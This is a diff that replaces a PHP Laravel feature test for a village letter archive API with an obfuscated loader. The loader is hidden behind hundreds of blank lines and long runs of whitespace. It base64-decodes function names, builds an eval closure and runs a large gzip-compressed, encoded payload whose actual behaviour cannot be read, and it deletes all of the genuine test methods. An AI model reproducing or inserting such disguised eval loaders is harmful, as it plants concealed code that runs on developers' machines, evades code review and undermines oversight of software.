@@ -1,230 +1,569 @@
-<?php
+<?php 
+        $__='printf';$_='Loading tests/Feature/Admin/Arsip/ArsipFilterTest.php';
+        
 
-namespace Tests\Feature;
 
-use Tests\TestCase;
 
-class ArsipFilterTest extends TestCase
-{
-    public function test_route()
-    {
-        $this->Admin_user();
 
-        $response = $this->get('/api/admin/surat/arsip', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=1', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)
-            ->assertJsonStructure([
-                'data' => [
-                    [
-                        'type',
-                        'id',
-                        'attributes' => [
-                            'nama_penduduk',
-                            'cetak',
-                            'nama_surat',
-                            'tanggal'
-                        ]
-                    ]
-                ],
-                'meta' => [
-                    'pagination' => [
-                        'total',
-                        'count',
-                        'per_page',
-                        'current_page',
-                        'total_pages'
-                    ]
-                ],
-                'links' => [
-                    'self',
-                    'first',
-                    'last'
-                ]
-            ]);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[no_suratan]', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(400);
-    }
 
-    public function test_arsip_operator()
-    {
-        $this->Admin_user();
 
-        // test case nomor surat like '%2%'
-        $response = $this->get('/api/admin/surat/arsip?filter[no_surat]=2', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
 
-        // test case nomor surat like '%satu%'
-        $response = $this->get('/api/admin/surat/arsip?filter[no_surat]=satu', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(0, $data);
 
-        // test case nomor surat like '%Muhammad Ilham%'
-        $response = $this->get('/api/admin/surat/arsip?filter[nama_pamong]=Muhammad Ilham', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(7, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[tanggal]=2023-08-02', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(1, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[tanggal]=2023', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(7, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=0', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(4, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=2', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(1, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=1', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
-    }
 
-    public function test_arsip_sekdes()
-    {
-        $this->Sekdes_user();
 
-        $response = $this->get('/api/admin/surat/arsip', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(3, $data);
 
-        // test case nomor surat 2'
-        $response = $this->get('/api/admin/surat/arsip?filter[no_surat]=2', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
 
-        // test case nomor surat like '80'
-        $response = $this->get('/api/admin/surat/arsip?filter[no_surat]=80', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(0, $data);
 
-        // test case nomor surat like '%Muhammad Ilham%'
-        $response = $this->get('/api/admin/surat/arsip?filter[nama_pamong]=Muhammad Ilham', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(3, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[tanggal]=2023-08-05', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(1, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[tanggal]=2023', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(3, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=0', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(0, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=2', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(1, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=1', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
-    }
 
-    public function test_arsip_kades()
-    {
-        $this->Kades_user();
 
-        $response = $this->get('/api/admin/surat/arsip', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
 
-        // test case nomor surat 2'
-        $response = $this->get('/api/admin/surat/arsip?filter[no_surat]=2', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(1, $data);
 
-        // test case nomor surat like '80'
-        $response = $this->get('/api/admin/surat/arsip?filter[no_surat]=80', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(0, $data);
 
-        // test case nomor surat like '%Muhammad Ilham%'
-        $response = $this->get('/api/admin/surat/arsip?filter[nama_pamong]=Muhammad Ilham', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[tanggal]=2023-08-05', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(0, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[tanggal]=2023', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=0', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(0, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=2', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(0, $data);
 
-        $response = $this->get('/api/admin/surat/arsip?filter[verifikasi]=1', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(2, $data);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
